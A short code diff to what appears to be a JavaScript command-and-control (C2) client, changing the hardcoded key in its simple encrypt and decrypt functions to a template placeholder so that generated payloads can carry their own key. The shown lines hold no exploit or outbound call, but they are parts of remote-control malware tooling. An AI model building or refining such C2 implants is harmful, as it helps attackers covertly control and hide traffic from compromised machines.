@@ -9,7 +9,7 @@ const C2_PORT = {{C2_PORT}};
 const RECONNECT_DELAY = 5000;
 
 function simpleEncrypt(data) {
-    const key = Buffer.from('C2_SECRET_KEY_CHANGE_THIS');
+    const key = Buffer.from('{{ENCRYPTION_KEY}}');
     const dataBuffer = Buffer.from(data);
     const encrypted = Buffer.alloc(dataBuffer.length);
 
@@ -21,7 +21,7 @@ function simpleEncrypt(data) {
 }
 
 function simpleDecrypt(data) {
-    const key = Buffer.from('C2_SECRET_KEY_CHANGE_THIS');
+    const key = Buffer.from('{{ENCRYPTION_KEY}}');
     const dataBuffer = Buffer.from(data, 'base64');
     const decrypted = Buffer.alloc(dataBuffer.length);
 
